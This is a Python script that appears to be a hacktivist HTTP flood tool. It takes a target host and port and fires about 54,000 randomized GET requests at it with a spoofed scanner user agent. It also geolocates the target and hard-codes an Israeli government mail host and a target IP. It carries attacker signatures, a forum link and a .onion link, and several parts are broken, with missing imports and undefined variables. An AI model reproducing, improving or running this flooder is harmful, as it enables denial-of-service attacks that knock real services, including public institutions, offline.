#!/usr/bin/env python3
#
import hashlib, json, os, platform, random, requests, socket, sys, time ,uuid
from datetime import datetime
from threading import Timer
#
hello = '''

       ██   ██  █████  ███    ██ ███    ██  █████  
       ██   ██ ██   ██ ████   ██ ████   ██ ██   ██ 
       ███████ ███████ ██ ██  ██ ██ ██  ██ ███████ 
       ██   ██ ██   ██ ██  ██ ██ ██  ██ ██ ██   ██ 
       ██   ██ ██   ██ ██   ████ ██   ████ ██   ██ 
                                            
               ███████  ██████  ███████ ███████  █████     
               ██      ██    ██ ██      ██      ██   ██    
               ███████ ██    ██ █████   █████   ███████    
                    ██ ██    ██ ██      ██      ██   ██    
               ███████  ██████  ██      ███████ ██   ██    

'''

w1 = '\tLOCKED OUT OF SERVER; kwafeLt wAS hERE..'
w2 = '\thttps://dragonforce.io/members/kwafelt.30011/'
w3 = '\thttps://www.instagram.com/kwafelt/?'
w4 = f'https://cookieleaks.onion/?landing=default.htm&session=temp'

Browser_identification = 'Chrome/104.0.5112.102 OPR/90.0.4480.80'
ps4 = 'WorkaroundCtl/1.00 libhttp/9.60 (PlayStation 4)'
user_agent = 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)'

station = socket.gethostname();
address = socket.gethostbyname(station)
hostnme = os.uname()[0];
usernme = os.environ.get('USERNAME')
admin = os.getlogin();
admin = str(admin).replace('K', 'k').replace('l', 'L')
MAC = hex(uuid.getnode());
slEEp = 0.75

ROOT = [""]
#STAT = [socket.gethostname(),socket.gethostbyname(STAT[0])]
HTTP = ['HTTP/1.0','HTTP/1.1','h2']
HOST = ['writ.er.ws','search.censys.io']
CONN = ['close','Keep-Alive']

target_host = None
target_port = None

p1 = [sys.argv[0], "",""]

#

def dev():
    data = 'mail.tel-aviv.gov.il'
    print(socket.gethostbyname(data))


TARGET_IP = '80.179.151.134'; status = 'dorman'
#
workstation = "Hanna Sofea's comrade";
v4L = f'{admin} wAS hERE'
txt = ["","written by kwafelt"]
inject = 'Injecting process';
question = 'Do you want to continue ?'
confirm = ['Do you want to continue ?','Is this ok ?']


# parse_input
num_requests = 0;
thread_num = 0;

# cdata.py
#
def color(r, g, b, text):
  return '\033[38;2;{};{};{}m{}\033[38;2;255;255;255m'.format(r, g, b, text);

def title(c):
  if (c == 'start'): terminal_title = f'{workstation} \ {txt[1]}'
  if (c == 'prcss'): terminal_title = f'{inject} \ {target_host}:{target_port} \ {v4L}'
  print(f'\33]0;{terminal_title}\a', end = txt[0], flush = True)

def write(c):
  return sys.stdout.write(c)

def ossys(c):
  return os.system(c)

def timer(c):
  Timer(c, parse).start()

def ctim3(c):
  waktu = datetime.now() # current date and time
  if (c == 0):
    strtim3 = waktu.strftime('%y/%m/%d %H:%M:%S')
  if (c == 1):
    strtim3 = waktu.strftime('%f')
  if (c == 2):
    day_of_year = waktu.timetuple().tm_yday  # day_of_year
    strtim3 = day_of_year
  return strtim3

def hash5(txt):
  str2hash = txt
  result = hashlib.md5(str2hash.encode())
  digest = result.hexdigest()
  return digest

def cdata(init):
  rawr = random.random()
  rawr = str(rawr).replace("0.","")
  raws = hash5(rawr)
  return raws

def reset(init):
  ossys('setterm --foreground default --background default --cursor on');
  if (init == 1):
    txt = f'STOPPING python3 {p1[0]} {p1[1]} {p1[2]}'
    write(f'\r\n {color(204,204,255,txt)}\r\n')
    write(f"\r\n {color(204,204,255,'T3R1M4 K4S3H ~')}\r\n\n")
    sys.exit(1)

def parse(init):
  global p1
  if (len(sys.argv) == 3):
    global target_host; global target_port
    target_host = str(sys.argv[1]); p1[1] = target_host
    target_port = int(sys.argv[2]); p1[2] = target_port
    verif(init)
  else:
    write(f'\r\n Usage: {sys.argv[0]} <target_host> <target_host>')
    write(f'\r\n exmpl: {sys.argv[0]} 255.255.255.255 443\n')
    reset(init); sys.exit(init)

def verif(init):
  try:
    r = socket.gethostbyname(target_host); s = socket.create_connection((r, target_port), 2)
    start(init)
  except (IOError, OSError):
    txt = color(245, 45, 45, 'SYSTEM LOCKDOWN / SERVER OFFLINE / FILTERED / CLOSED PORT');
    write(f'\r\n {txt}\r\n');
    reset(0)
  finally: pass

def start(init):
  ossys('setterm --foreground cyan --background black --cursor on')
  ossys('clear');
  title('start'); write(f"{color(248,152,128,hello)}")
  accss('access code')

def accss(text):
  reply = input(f"\r\n {color(248,152,128,text)}  :  ")
  if (reply == 'bypass') or (reply == '30011') or (reply == '2022'):
    press(0)
  else: accss('  try again')

def press(c):
  ossys('setterm --foreground white --background black --cursor on')
  ossys('clear')
  tx1 = color(242,210,189, admin)
  tx2 = color(192,192,192, station)
  tx3 = color(242,210,189, MAC)
  tx4 = color(192,192,192, client('os'))
  tx5 = color(242,210,189, platform.release())
  write(f'\r\n {tx1} {tx2} {tx3} {tx4} {tx5}\r\n')
  write(f'\r\n {ipapi(0)}\r\n')
  tx6 = color(248,152,128, f'wanna/will inject process to {target_host} : {target_port}')
  write(f'\r\n {tx6}\r\n')
  write(f'\r\n {ipapi(1)}\r\n')
  yes_or_no(confirm[0])

def yes_or_no(question):
  reply = input(f'\r\n {color(248,152,128, question)} [y/N] ')
  if (reply == '') or (reply[0] == 'n'):
    reset(0); ossys('clear'); return False
  if (reply[0] == 'y'):
    recon(0); #return False
  else: return yes_or_no('so.. YES or NO ?')

def yes_or_no_ORIG(question):  # BROKEN
  reply = str(raw_input(question + ' [y/N] ')).lower().strip()
  if reply[0] == 'y': return True
  if reply[0] == 'n': return False
  else: return yes_or_no("Uhhhh... please enter ")

def recon(c):
  ossys('setterm --background black --cursor off')
  ossys('clear')
  title('prcss')
  tx1 = ctim3(0)
  tx2 = f"{inject}.."
  pst = print_status()
  pst.initial(tx1, tx2)
  process(15400);
  
################################################################################
def ipapi(i):
  URL = ['http://ip-api.com/json/', f'http://ip-api.com/json/{target_host}'];  # EDT https://ipinfo.io/json/1.1.1.1
  response = requests.get(URL[i])
  txt = json.loads(response.text)
  if (txt['status'] == 'success'):
  
    tx1 = f"{color(245, 245, 245, txt['country'])} {color(227, 10, 92, txt['regionName'])} {color(0, 110, 210, txt['city'])} {color(245, 245, 245, txt['zip'])}";
    tx2 = f"\r\n {color(227, 10, 92, txt['isp'])}\n {color(0, 110, 210, txt['query'])}"
    out = tx1 + tx2
  else:
    out = f"{color(245, 245, 245, txt['query'])} {color(0, 110, 210, txt['message'])}"
  return out
################################################################################
#
# scratch.py
#
def client(init):  # platform
    client_os = platform.system();
    un = platform.uname();
    client_hn = platform.node();  # hostname
    if (init == 'os'): return client_os;
    if (init == 'hn'): return client_hn;


def address(LAN):
    if LAN == 0:
        hostname = socket.gethostname()  # getting the IP address using socket.gethostbyname() method
        ip_address = socket.gethostbyname(hostname)  # getting the IP address using socket.gethostbyname() method
        addr = ip_address  # print(f"Hostname: {hostname}") # print(f"IP Address: {ip_address}")
    if LAN == 1:
        wifi = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        wifi.connect((remote_server, 80))  # 443
        addr = wifi.getsockname()[0]
    return addr

###############################################################################

class print_status():
    def initial(self, time, txt1):
        tx1 = color(245, 215, 0, time);
        tx2 = color(99, 99, 99, 'Initial');
        tx3 = color(255, 215, 0, txt1);
        sys.stdout.write(f'\r {tx1} {tx2} {tx3}\r');

    def success(self, time, txt1):
        tx1 = color(224,191,184, time);
        tx2 = color(218,112,214, 'Success');
        tx3 = color(248,152,128, txt1);
        tx4 = color(224,191,184, v4L);
        sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');

    def timeout(self, time, txt1):
        tx1 = color(224,191,184, time);
        tx2 = color(255, 215, 0, 'Timeout');
        tx3 = '> ERR_CONNECTION_TIMEOUT_ERR';
        tx4 = color(0, 110, 210, '< RECONNECTING');
        sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');

    def failure(self, time, txt1):
        tx1 = color(145, 145, 145, time);
        tx2 = color(245, 110, 110, 'Failure');
        tx3 = color(255, 215, 0, 'No connection > server may be down');
        tx4 = color(224,191,184, '< RECONNECTING');
        sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');

    flag = 'ssl{kwafeLt_wAS_hERE}';

###############################################################################

def connect_h2_socket(host):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  context = ssl.create_default_context()
  context.set_alpn_protocols(["h2"])
  sock.connect((host, 443))
  sock = context.wrap_socket(sock, server_hostname=host)
  return sock
def grow():
  s.sendall("GET / HTTP/1.1\r\nHost: github.com\r\nConnection: close\r\n\r\n")
  s = connect_h2_socket("1.1.1.1")
  print("Selected protocol:", s.selected_alpn_protocol())
  print(s.recv())

def attackORIG(init):
    global slEEp;
    time.sleep(slEEp);
    time1 =ctim3(0);
    time2 =ctim3(1);
    hexd = hash5(time2);
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
        try:
            address = (target_host, target_port);
            proc.connect(address)
            proc.settimeout(1.5)  # saat
            proc.sendto((f'GET /?{hexd} HTTP/1.1\r\nHost: {proxy}\r\n').encode('ascii'), address);
            proc.sendto((f'User-Agent: {user_agent}\r\nAccept-Encoding: gzip, deflate\r\n').encode('ascii'), address);
            proc.sendto((f'Accept: text/plain,*/*\r\nConnection: keep-alive\r\n').encode('ascii'), address);
            proc.sendto((f'Keep-Alive: timeout=15, max=100\r\n\r\n').encode('ascii'), address);
            #
            if (init == 'debug'): response = proc.recv(4096); print(f'\r\n' + response.decode('ascii'))
            # num = recv(s, addr_of_buffer, len_of_buffer, 0);
            #
            proc.shutdown(socket.SHUT_RDWR);
            proc.close();
            slEEp = 0.02;
            st = print_status();
            st.success(time1, hexd)
        except socket.timeout:
            slEEp = 0.50;
            st = print_status();
            st.timeout(time1, None)
        except socket.error:
            slEEp = 1.00;
            st = print_status();
            st.failure(time1, None)
        except (KeyboardInterrupt, SystemExit):
            sys.exit(0);
        finally:
            pass;
    return slEEp;

def attack(init):
  global slEEp; time1 = ctim3(0); data = cdata(9)
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
    try:
      address = (target_host, target_port); proc.connect(address); proc.settimeout(2)
      bytes1 = f'GET /?!{data} {HTTP[1]}\r\nHost: {HOST[1]}\r\nUser-Agent: {user_agent}\r\n'
      bytes2 = f'Accept-Encoding: gzip, deflate\r\nConnection: {CONN[1]}\r\n\r\n'
      proc.sendto((bytes1).encode('ascii'), address)
      proc.sendto((bytes2).encode('ascii'), address)
      if (init == 'debug'):
        response = proc.recv(4096); print(bytes1,bytes2); print(f'\r\n' + response.decode('ascii'))
        print(f'receiving {len(response)} bytes data...')
      #response = proc.recv(4096) # D O R M A N
      proc.shutdown(socket.SHUT_RDWR); proc.close()
      slEEp = 0.02; st = print_status(); st.success(time1, data)
    except socket.timeout:
      slEEp = 0.50; st = print_status(); st.timeout(time1, None)
    except socket.error:
      slEEp = 1.00; st = print_status(); st.failure(time1, None)
    except (KeyboardInterrupt, SystemExit):
      sys.exit(0)
    finally: pass
  return slEEp;

def process_b(i):
    for i in range(99):  # 500
        time.sleep(slEEp);
        thread = threading.Thread(target=attack);
        thread.start()
    # ..D.O.R.M.A.N..

def process(i):
  while (i < 54001):
    if (i == 54000):
      i += 1
      time.sleep(1.0)
      flag = '10v3{5h371x1}'
      tx1 = color(204,204,255,f'COMPLETED / ETA {i} / {flag} / FINN')
      write(f'\r\n\n {tx1}\r\n')
      break
    else:
      try:
        attack(i);  # Timer(slEEp,attack).start();
      except (KeyboardInterrupt, SystemExit):
        tx1 = color(204,204,255,f'ETA {i} / CTRL-C PRESSED / KEYBOARD INTERRUPT')
        write(f'\r\n\n {tx1}\r\n')
        sys.exit(0);
      finally: pass
################################################################################
try:
  parse(0); cdata(0)
except (KeyboardInterrupt, IOError, OSError):
  tx1 = color(204,204,255,'KEYBOARD INTERRUPT RECEIVED, EXITING / CLOSE ..');
  write(f'\n {tx1}\r\n'); sys.exit(0)
except SystemExit as EXIT: pass
finally: reset(1); sys.exit(1);
##############################!TERIMA-KASEH~####################################
